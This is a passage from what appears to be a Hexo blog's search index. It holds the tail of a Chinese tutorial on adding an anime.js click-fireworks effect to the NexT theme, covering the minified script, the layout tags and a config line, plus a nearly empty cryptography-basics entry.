class="title">function</span></span>()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;<span class="keyword">function</span> renderParticule(e)&#123;<span class="keyword">for</span>(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="keyword">function</span> animateParticules(e,t)&#123;<span class="keyword">for</span>(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:<span class="keyword">function</span>(e)&#123;<span class="built_in">return</span> e.endPos.x&#125;,y:<span class="keyword">function</span>(e)&#123;<span class="built_in">return</span> e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:<span class="string">"easeOutExpo"</span>,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:<span class="string">"linear"</span>,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:<span class="string">"easeOutExpo"</span>,update:renderParticule,offset:0&#125;)&#125;<span class="keyword">function</span> debounce(e,t)&#123;var a;<span class="built_in">return</span> <span class="function"><span class="title">function</span></span>()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(<span class="function"><span class="title">function</span></span>()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(<span class="string">".fireworks"</span>);<span class="keyword">if</span>(canvasEl)&#123;var ctx=canvasEl.getContext(<span class="string">"2d"</span>),numberOfParticules=30,pointerX=0,pointerY=0,tap=<span class="string">"mousedown"</span>,colors=[<span class="string">"#FF1461"</span>,<span class="string">"#18FF92"</span>,<span class="string">"#5A87FF"</span>,<span class="string">"#FBF38C"</span>],setCanvasSize=debounce(<span class="function"><span class="title">function</span></span>()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+<span class="string">"px"</span>,canvasEl.style.height=window.innerHeight+<span class="string">"px"</span>,canvasEl.getContext(<span class="string">"2d"</span>).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:<span class="function"><span class="title">function</span></span>()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,<span class="keyword">function</span>(e)&#123;<span class="string">"sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"toggle-sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"A"</span>!==e.target.nodeName&amp;&amp;<span class="string">"IMG"</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(<span class="string">"resize"</span>,setCanvasSize,!1)&#125;;</span><br></pre></td></tr></table></figure>
<p>修改layout文件<br>打开<code>./themes/next/layout/_layout.swig</code>并在<head>中间添加以下代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 爆炸效果 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">class</span>=<span class="string">"fireworks"</span> <span class="attr">style</span>=<span class="string">"position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"//cdn.bootcss.com/animejs/2.2.0/anime.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/js/firework.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>配置主题文件<br>打开<code>./themes/next</code>路径下的_config.yml文件并在末尾添加以下代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fireworks</span></span><br><span class="line">fireworks: <span class="literal">true</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>密码基础</title>
    <url>/2016/03/30/%E5%AF%86%E7%A0%81%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="wef"><a href="#wef" class="headerlink" title="wef"></a>wef</h2>]]></content>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
</search>
